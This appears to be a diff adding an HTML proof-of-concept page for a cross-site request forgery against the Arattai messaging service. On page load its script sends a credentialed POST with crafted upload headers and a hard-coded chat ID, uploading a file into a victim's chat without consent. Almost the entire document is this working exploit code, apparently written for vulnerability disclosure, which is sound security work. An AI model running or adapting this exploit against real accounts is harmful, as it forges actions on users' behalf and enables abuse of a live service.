@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Try 1 POC</title></head>
+<body>
+<h3>Vanakam</h3>
+<pre id="out" style="white-space:pre-wrap;word-break:break-all;"></pre>
+
+<script>
+const HOST      = "https://files.arattai.in";
+const TARGET_CHATID = "CT_1469007622159071968_3335514-GC";
+const FILE_NAME = "hacked-csrf-exploit.txt";
+const FILE_BYTES = "This file was uploaded without the victim's knowledge or consent - CSRF Exploited.";
+
+async function sha256hex(bytes) {
+    const buf = new TextEncoder().encode(bytes);
+    const digest = await crypto.subtle.digest("SHA-256", buf);
+    return Array.from(new Uint8Array(digest)).map(b => b.toString(16).padStart(2, "0")).join("");
+}
+
+(async () => {
+    const refHash = await sha256hex(FILE_BYTES);
+    const bodyAttrs = JSON.stringify({ reference_hash: refHash });
+    const fullBody = bodyAttrs + FILE_BYTES;   
+
+    const uploadId = "attacker_" + Date.now();  
+
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", `${HOST}/webupload`);
+    xhr.withCredentials = true;  
+    xhr.setRequestHeader("X-Streammode", "1");
+    xhr.setRequestHeader("Upload-Id", uploadId);
+    xhr.setRequestHeader("File-Name", FILE_NAME);
+    xhr.setRequestHeader("X-Cliq-Content-Type", "text/plain");
+    xhr.setRequestHeader("Content-Type", "text/plain");
+    xhr.setRequestHeader("X-Arattai-Chatids", TARGET_CHATID);
+    xhr.setRequestHeader("X-Arattai-Type", "multi_recip");
+    xhr.setRequestHeader("X-Service", "arattai");
+    xhr.setRequestHeader("X-Dfs-Service", "zfs");
+    xhr.setRequestHeader("X-Body_attr_size", String(bodyAttrs.length));
+
+    xhr.send(fullBody);
+})();
+</script>
+</body>
+</html>
+
